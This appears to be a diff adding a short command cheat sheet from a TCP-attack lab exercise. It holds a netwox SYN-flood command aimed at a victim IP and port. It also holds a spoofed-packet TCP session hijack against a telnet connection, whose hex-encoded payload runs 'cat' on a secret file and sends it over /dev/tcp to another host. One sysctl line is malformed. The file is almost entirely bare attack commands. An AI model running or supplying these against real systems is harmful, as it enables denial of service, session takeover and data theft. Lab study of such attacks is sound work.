@@ -1,0 +1,9 @@
+sudo sysctl net.ipv4.conf.all.accept_redirects
+sudo sysctl net.ipv4.ip_forward
+watch -n 1 "netstat -na | grep SYN-RECV | wc -l"
+sudo netwox 76 -i victim_ip -p victim_port
+Sudo sysctl -w net.ipv4.tcp_syncookies
+sudo ip tcp_metrics flush
+sudo ip tcp_metrics show
+"\n".encode("hex")
+sudo netwox 40 --ip4-src 10.0.2.6 --ip4-dst 10.0.2.5   --tcp-src 57928 --tcp-dst 23   --tcp-seqnum 527096508 --tcp-acknum 939205509   --tcp-ack --tcp-psh   --tcp-window 254 --ip4-ttl 128   --tcp-data 636174202f686f6d652f736565642f7365637265742e747874203e202f6465762f7463702f31302e302e322e342f393039300a
